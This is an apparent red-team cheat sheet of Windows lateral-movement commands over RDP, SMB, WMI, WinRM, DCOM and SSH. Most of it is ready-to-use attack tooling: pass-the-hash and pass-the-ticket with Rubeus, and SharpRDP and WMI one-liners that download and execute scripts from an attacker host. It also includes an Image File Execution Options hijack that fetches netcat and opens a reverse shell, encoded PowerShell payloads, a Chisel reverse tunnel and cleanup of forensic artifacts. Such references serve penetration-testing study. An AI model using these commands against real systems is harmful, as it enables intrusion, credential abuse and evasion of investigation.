## Remote Desktop Protocol (RDP)

### Connect with xfreerdp

```bash
xfreerdp /v:<target-ip> /u:<username> /p:<password> /dynamic-resolution
```

### RDP with Restricted Admin Mode (Pass-the-Hash)

Restricted Admin mode allows connecting with an NT hash instead of cleartext password.

```cmd
mstsc.exe /restrictedAdmin
```

### Check/Set Restricted Admin Registry Key

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```

### Request TGT and Pass-the-Ticket for RDP

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe asktgt /user:<username> /rc4:<hash> /domain:<domain> /ptt
```

### Headless RDP Command Execution (SharpRDP)

Execute commands on a remote host via RDP without interactive session.

```powershell
.\SharpRDP.exe computername=<workstation> command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/s')" username=<domain>\<username> password=<password>
```

### Setup Tunneled RDP via Chisel

```cmd
.\chisel.exe client <attacker-ip>:<port> R:socks
```

### Clean Up Run MRU Artifacts

```powershell
wget -Uri http://<attacker-ip>/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs
.\CleanRunMRU.exe clearall
```

---

## Server Message Block (SMB)

### PsExec - Remote Command Execution

Spawns an interactive session using the ADMIN$ share. Requires local admin.

```cmd
.\PsExec.exe \\<target> -i -s -u <DOMAIN>\<username> -p <password> cmd
```

### SharpNoPSExec - PSExec Without Service Creation

```powershell
.\SharpNoPSExec.exe --target=<target-ip> --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e <base64-payload>"
```

### NimExec

```cmd
.\NimExec -u <username> -d <domain> -p <password> -t <target-ip> -c "cmd.exe /c powershell -e <base64-payload>" -v
```

### Image File Execution Options Hijack (Debugger Key)

If you have remote registry write access, you can intercept any process launch on the target.

```cmd
reg.exe add "\\<target>.<domain>\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\<attacker-ip>\share\nc.exe && nc.exe -e \windows\system32\cmd.exe <attacker-ip> 8080"
```

### Enable SMB Guest Share Access

```cmd
reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
```

---

## Windows Management Instrumentation (WMI)

### Query Remote OS Details (WMIC)

```cmd
wmic /node:<target-ip> os get Caption,CSDVersion,OSArchitecture,Version
```

### Query Remote OS Details (PowerShell)

```powershell
Get-WmiObject -Class Win32_OperatingSystem -ComputerName <target-ip> | Select-Object Caption, CSDVersion, OSArchitecture, Version
```

### Execute Process Remotely (WMIC)

```cmd
wmic /node:<target-ip> process call create "notepad.exe"
```

### Execute Process Remotely (PowerShell WMI)

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName <target-ip>
```

### Execute with Explicit Credentials (WMIC)

```cmd
wmic /user:<username> /password:<password> /node:<target-ip> os get Caption,CSDVersion,OSArchitecture,Version
```

### Execute Payload with Credentials (PowerShell WMI)

```powershell
$credential = New-Object System.Management.Automation.PSCredential("<username>", (ConvertTo-SecureString "<password>" -AsPlainText -Force))
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/s')" -ComputerName <target-ip> -Credential $credential
```

---

## Windows Remote Management (WinRM)

### Invoke-Command (Current User)

```powershell
Invoke-Command -ComputerName <target-ip> -ScriptBlock { hostname; whoami }
```

### Invoke-Command with Credentials

```powershell
$username = "<username>"
$password = "<password>"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
Invoke-Command -ComputerName <target-ip> -Credential $credential -ScriptBlock { whoami; hostname }
```

### WinRS (Current User)

```cmd
winrs -r:<target-ip> "powershell -c whoami;hostname"
```

### WinRS with Credentials

```cmd
winrs /remote:<target-ip> /username:<username> /password:<password> "powershell -c whoami;hostname"
```

### Create PSSession, Copy Files, Enter Session

```powershell
$session = New-PSSession -ComputerName <target-ip> -Credential $credential
Copy-Item -ToSession $session -Path 'C:\Users\<username>\Desktop\Sample.txt' -Destination 'C:\Users\<username>\Desktop\Sample.txt' -Verbose
Copy-Item -FromSession $session -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\Users\<username>\Desktop\host.txt' -Verbose
Enter-PSSession $session
```

### evil-winrm (Linux)

```bash
evil-winrm -i <target-ip> -u <username> -p '<password>'
evil-winrm -i <target-ip> -u <username> -H <hash>
```

---

## Distributed Component Object Model (DCOM)

### Find ShellWindows CLSID

```powershell
Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' | ForEach-Object {
    Get-ItemProperty -Path $_.PSPath | Where-Object {$_.'(default)' -eq 'ShellWindows'} | Select-Object -ExpandProperty PSChildName
}
```

### Create Remote DCOM Instance

```powershell
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","<target-ip>"))
```

---

## SSH

### Connect to Target via SSH

```bash
ssh <username>@<target>
ssh -i C:\helen_id_rsa -l <username>@<domain> -p <target-port> <target>
```

### Check SSH Key Permissions (Windows)

```cmd
icacls.exe C:\helen_id_rsa
```

---

## Remote Management Tools (VNC/Other)

### Test Connectivity to VNC Port

```powershell
Test-NetConnection -ComputerName <target> -Port 5900
```

### Query TightVNC Settings

```cmd
reg query HKLM\SOFTWARE\TightVNC\Server /s
```
